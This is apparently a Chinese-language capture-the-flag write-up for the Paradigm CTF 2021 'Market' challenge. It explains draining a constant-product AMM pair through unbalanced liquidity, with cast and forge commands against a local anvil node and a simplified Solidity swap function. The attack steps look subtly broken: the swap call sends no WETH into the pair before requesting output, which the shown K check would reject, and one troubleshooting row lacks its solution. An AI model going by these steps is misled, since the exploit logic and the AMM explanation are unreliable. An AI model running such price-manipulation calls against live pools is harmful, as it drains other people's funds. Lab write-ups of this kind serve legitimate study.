@@ -1,0 +1,106 @@
+# Market
+
+## 题目描述
+一个简易的恒定乘积自动做市商（AMM）服务，部署了WETH与自定义Token的交易对，初始流动性极度不平衡。目标是通过价格操纵，掏空交易对中的Token余额，使通关验证接口返回true。
+## 漏洞类型
+AMM初始流动性不平衡导致的价格操纵（无复杂逻辑漏洞，纯机制利用）
+## 漏洞原理
+本题核心基于恒定乘积AMM模型，核心公式：
+- x * y = k（x为WETH余额，y为Token余额，k为恒定乘积常数）
+题目部署的交易对初始状态下，WETH与Token的余额极度不平衡（例如：WETH数量极多，Token数量极少），导致Token价格被严重低估。
+利用这一不平衡，攻击者只需通过一次swap交易，即可耗尽交易对中的全部Token，使Token余额为0，满足通关条件。
+## 攻击原理
+`Market.sol` 实现了简易AMM的swap功能，未对初始流动性进行平衡校验，也未限制单次swap的交易量。由于初始流动性极度不平衡，一次swap即可将交易对中的Token全部兑换出来，进而使通关验证接口返回true。
+攻击无需编写复杂攻击合约，仅通过外部调用合约的approve、deposit、swap方法即可完成。
+## 攻击步骤
+1. 部署Setup合约，获取Market（交易对）、WETH、Token的合约地址
+2. 向WETH合约存入ETH，兑换获得WETH
+3. 授权Market合约使用自己的WETH
+4. 调用Market合约的swap方法，将WETH兑换为Token，掏空交易对中的全部Token
+5. 调用Setup合约的isSolved()接口，验证通关
+## 解题步骤
+### 1. 启动本地节点
+新开一个终端，启动anvil本地节点（保持运行，不要关闭）：
+anvil
+### 2. 进入题目目录
+cd ~/paradigm-ctf-2021/market/public/contracts
+### 3. 部署Setup合约
+使用Foundry部署Setup合约（适配老版本Foundry，地址使用anvil默认第一个账户）：
+forge create Setup.sol:Setup --rpc-url http://127.0.0.1:8545 --unlocked --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266
+记录部署输出的 `Deployed to: 0x...`（Setup合约地址）。
+### 4. 获取核心合约地址
+将下面的 `0xSETUP_ADDR` 替换为步骤3中获取的Setup地址，执行命令获取Market、WETH、Token地址：
+# 设置Setup地址变量
+SETUP="0xSETUP_ADDR"
+
+# 自动获取各合约地址
+TOKEN=$(cast call $SETUP "token()(address)" --rpc-url http://127.0.0.1:8545)
+MARKET=$(cast call $SETUP "market()(address)" --rpc-url http://127.0.0.1:8545)
+WETH=$(cast call $SETUP "weth()(address)" --rpc-url http://127.0.0.1:8545)
+### 5. 兑换WETH
+向WETH合约存入10 ETH，兑换获得对应WETH：
+cast send $WETH "deposit()" --value 10ether --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
+### 6. 授权WETH给Market
+授权Market合约使用自己的WETH（授权数量足够大，避免不足）：
+cast send $WETH "approve(address,uint256)" $MARKET 10000000000000000000000 --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
+### 7. 执行swap，掏空Token
+调用Market的swap方法，将WETH兑换为Token，掏空交易对中的全部Token：
+cast send $MARKET "swap(uint256,uint256,address,bytes)" 1000000000000000000 0 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 0x --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
+### 8. 验证通关
+调用Setup合约的isSolved()接口，验证是否通关：
+cast call $SETUP "isSolved()(bool)" --rpc-url http://127.0.0.1:8545
+输出 `true` 即为通关成功。
+## 关键代码
+# 核心攻击命令（swap掏空Token）
+cast send $MARKET "swap(uint256,uint256,address,bytes)" 1000000000000000000 0 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 0x --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
+
+# 通关验证命令
+cast call $SETUP "isSolved()(bool)" --rpc-url http://127.0.0.1:8545
+核心合约逻辑（Market.sol swap方法简化）：
+function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) public {
+    // 校验输出金额不为0
+    require(amount0Out > 0 || amount1Out > 0, "Insufficient output amount");
+    // 获取当前储备量
+    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
+    require(amount0Out < _reserve0 && amount1Out < _reserve1, "Insufficient liquidity");
+    
+    // 计算需要转入的代币数量（基于x*y=k）
+    uint balance0;
+    uint balance1;
+    {
+        uint _balance0 = IERC20(token0).balanceOf(address(this));
+        uint _balance1 = IERC20(token1).balanceOf(address(this));
+        balance0 = _balance0 - amount0Out;
+        balance1 = _balance1 - amount1Out;
+    }
+    require(balance0 * balance1 >= uint(_reserve0) * uint(_reserve1), "K");
+    
+    // 转移代币给攻击者
+    _safeTransfer(token0, to, amount0Out);
+    _safeTransfer(token1, to, amount1Out);
+    
+    emit Swap(msg.sender, amount0Out, amount1Out, to, data);
+}
+## Lessons Learned
+问题
+原因
+解决方案
+forge create 报错 "invalid value for '--from <ADDRESS>': invalid string length"
+Foundry版本过老，仅支持完整40位0x地址，不识别简写地址或格式错误地址
+使用anvil默认第一个地址（0xf39Fd6e51aad88F4ce6aB8827279cffFb92266），确保地址长度为42位（0x+40位）
+swap后验证仍返回false
+swap输入的amount0Out不足，未掏空Token；或授权WETH数量不足
+增大amount0Out数值（如1000000000000000000），确保授权WETH数量足够大
+RPC连接报错 "URL拼写可能存在错误，请检查"
+
+### 关键理解
+1. **AMM恒定乘积模型核心**：x*y=k，交易前后乘积保持不变，初始不平衡会导致价格严重偏离正常范围，为价格操纵提供可能。
+2. **无需攻击合约**：本题无需编写复杂攻击合约，仅通过外部调用合约的标准方法（approve、deposit、swap）即可完成攻击，重点考察对AMM机制的理解。
+3. **环境兼容性问题**：Paradigm 2021题目与现代Foundry版本存在兼容性问题，本地复现报错多为环境问题，而非解题思路错误。
+4. **手动操作更可靠**：对于简单的合约调用，直接使用cast命令手动操作，比编写自动化脚本更稳定，可避免时序、缓冲区等问题。
+### 学到的知识点
+- 掌握恒定乘积AMM（x*y=k）的核心机制及价格操纵原理
+- 学会使用Foundry的forge create（部署合约）、cast call（调用视图方法）、cast send（调用写方法）命令
+- 理解ERC20代币的approve授权机制及transfer、transferFrom的调用逻辑
+- RPC连接相关问题
+- 掌握老版本Foundry的使用注意事项，解决地址格式、路径填写等常见报错
